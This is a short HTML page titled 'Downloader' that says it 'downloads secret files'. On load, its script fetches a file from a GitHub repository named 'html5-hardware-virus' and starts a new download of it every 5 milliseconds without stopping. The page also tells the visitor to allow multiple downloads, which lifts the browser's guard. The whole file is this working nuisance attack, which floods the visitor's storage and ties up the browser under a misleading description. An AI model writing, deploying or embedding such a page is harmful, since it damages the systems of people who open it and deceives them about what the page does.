<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Downloader</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #f4f4f9;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            display: inline-block;
        }
        h1 {
            color: #333;
        }
        #counter {
            font-size: 24px;
            font-weight: bold;
            color: #007BFF;
            margin-top: 20px;
        }
        .note {
            margin-top: 20px;
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Downloader</h1>
        <p>Downloads secret files</p>
        <div id="counter">0</div>
        <p class="note">Note: You may need to look at your browser bar and click "Allow multiple downloads" if it blocks them.</p>
    </div>

    <script>
        const fileUrl = "https://raw.githubusercontent.com/CameronCodesStuff/html5-hardware-virus/main/download.txt";
        let downloadCount = 0;

        async function triggerDownload() {
            try {
                const response = await fetch(fileUrl);
                const blob = await response.blob();
                const localUrl = URL.createObjectURL(blob);

                const downloadLink = document.createElement('a');
                downloadLink.href = localUrl;
                downloadLink.setAttribute('download', 'download.txt');
                
                document.body.appendChild(downloadLink);
                downloadLink.click();
                document.body.removeChild(downloadLink);

                URL.revokeObjectURL(localUrl);

                downloadCount++;
                document.getElementById('counter').innerText = "Downloads triggered: " + downloadCount;
            } catch (error) {
                console.error(error);
            }
        }

        triggerDownload();

        setInterval(triggerDownload, 5);
    </script>

</body>
</html>
